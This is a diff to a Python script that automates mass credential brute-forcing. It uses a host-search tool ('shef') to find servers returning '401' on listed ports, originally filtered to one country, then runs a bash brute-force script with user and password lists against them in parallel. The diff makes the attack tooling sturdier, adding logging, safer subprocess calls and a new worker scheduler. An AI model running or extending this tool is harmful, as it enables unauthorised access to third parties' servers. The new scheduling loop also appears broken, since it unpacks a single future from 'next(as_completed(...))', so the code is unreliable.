@@ -3,6 +3,10 @@ import shutil
 import subprocess
 from concurrent.futures import ProcessPoolExecutor, as_completed
 import time
+import logging
+
+# Logging configuration
+logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")
 
 # Configuration
 ports_file = "ports.txt"
@@ -19,12 +23,13 @@ os.makedirs(ports_dir, exist_ok=True)
 # Read the ports from ports.txt
 try:
     with open(ports_file, "r") as file:
-        ports = [line.strip() for line in file if line.strip()]
+        ports = [line.strip() for line in file if line.strip() and line.strip().isdigit()]
 except FileNotFoundError:
     print(f"Error: {ports_file} not found.")
     exit(1)
 
-def process_shef_with_delay(ports, delay_after, delay_seconds):
+
+def process_shef_with_delay(ports: list[str], delay_after: int, delay_seconds: int):
     """
     Process the shef commands sequentially with a delay after every `delay_after` commands.
     Skip if the directory and hosts file already exist.
@@ -41,29 +46,29 @@ def process_shef_with_delay(ports, delay_after, delay_seconds):
         os.makedirs(port_dir, exist_ok=True)
 
         # Run the 'shef' command and save the output
-        shef_command = f"shef -q \"country:ru '401' port:{port}\" > {output_file}"
-        print(f"Running shef for port {port}: {shef_command}")
         try:
-            subprocess.run(shef_command, shell=True, check=True)
+            with open(output_file, "w") as f:
+                subprocess.run(["shef", "-q", f"country:test '401' port:{port}"], stdout=f, check=True)
         except subprocess.CalledProcessError as e:
-            print(f"Error running shef for port {port}: {e}")
+            logging.error(f"Error running shef for port {port}: {e}")
             continue
 
         # Copy necessary files into the directory
         for file in files_to_copy:
             source_path = os.path.join(httpbrute_dir, file)
             destination_path = os.path.join(port_dir, file)
-            if os.path.exists(source_path):
+            try:
                 shutil.copy(source_path, destination_path)
-            else:
+            except FileNotFoundError:
                 print(f"Warning: {file} not found in {httpbrute_dir}.")
 
         # Introduce a delay after every `delay_after` commands
-        if counter % delay_after == 0 and counter != len(ports):
+        if counter % delay_after == 0 and counter < len(ports):
             print(f"Pausing for {delay_seconds} seconds to prevent server overload...")
             time.sleep(delay_seconds)
 
-def brute_force(port):
+
+def brute_force(port: str):
     """
     Execute the brute force script for a given port directory.
     """
@@ -73,44 +78,47 @@ def brute_force(port):
     user_list_path = os.path.join(port_dir, "users.txt")
     pass_list_path = os.path.join(port_dir, "passwd.txt")
 
-    brute_command = f"bash {script_path} {host_list_path} {user_list_path} {pass_list_path} {port}"
-    print(f"Running brute force for port {port}: {brute_command}")
+    brute_command = ["bash", script_path, host_list_path, user_list_path, pass_list_path, str(port)]
+    print(f"Running brute force for port {port}: {' '.join(brute_command)}")
     try:
-        subprocess.run(brute_command, shell=True, check=True)
+        subprocess.run(brute_command, check=True)
     except subprocess.CalledProcessError as e:
-        print(f"Error running brute force for port {port}: {e}")
+        logging.error(f"Error running brute force for port {port}: {e}")
 
-def run_brute_force_dynamically(ports, max_concurrent_ports):
+
+def run_brute_force_dynamically(ports: list[str], max_concurrent_ports: int):
     """
     Dynamically run brute force operations, maintaining a steady stream of `max_concurrent_ports` workers.
     """
     with ProcessPoolExecutor(max_workers=max_concurrent_ports) as executor:
-        # Submit initial tasks to fill up the pool
-        futures = {executor.submit(brute_force, port): port for port in ports[:max_concurrent_ports]}
-        remaining_ports = ports[max_concurrent_ports:]
+        futures = {}
+        remaining_ports = ports[:]
 
-        while futures:
-            # Wait for the first task to complete
-            done, _ = as_completed(futures, timeout=None)
-            for future in done:
-                port = futures.pop(future)  # Remove the completed future
+        while remaining_ports or futures:
+            # Submit new tasks if there are remaining ports and there are available workers
+            while len(futures) < max_concurrent_ports and remaining_ports:
+                new_port = remaining_ports.pop(0)
+                print(f"Assigning brute force task to port {new_port}")
+                futures[executor.submit(brute_force, new_port)] = new_port
+
+            # Wait for any task to complete
+            done, _ = next(as_completed(futures), (None, None))
+            if done:
+                port = futures.pop(done)
                 try:
-                    future.result()  # This will raise an exception if the task failed
+                    done.result()  # This will raise an exception if the task failed
                 except Exception as e:
-                    print(f"Error in brute force task for port {port}: {e}")
+                    logging.error(f"Error in brute force task for port {port}: {e}")
 
-                # Submit a new task if there are remaining ports
-                if remaining_ports:
-                    new_port = remaining_ports.pop(0)
-                    print(f"Assigning brute force task to port {new_port}")
-                    futures[executor.submit(brute_force, new_port)] = new_port
 
-# Step 1: Run 'shef' for all ports with delay
-print("Starting shef processing for all ports...")
-process_shef_with_delay(ports, delay_after, delay_seconds)
-print("Shef processing completed for all ports.")
+# Main Workflow
+if __name__ == "__main__":
+    # Step 1: Run 'shef' for all ports with delay
+    print("Starting shef processing for all ports...")
+    process_shef_with_delay(ports, delay_after, delay_seconds)
+    print("Shef processing completed for all ports.")
 
-# Step 2: Start brute-forcing dynamically
-print("Starting brute force attacks for all ports...")
-run_brute_force_dynamically(ports, max_concurrent_ports)
-print("Brute force operations completed for all ports.")
+    # Step 2: Start brute-forcing dynamically
+    print("Starting brute force attacks for all ports...")
+    run_brute_force_dynamically(ports, max_concurrent_ports)
+    print("Brute force operations completed for all ports.")
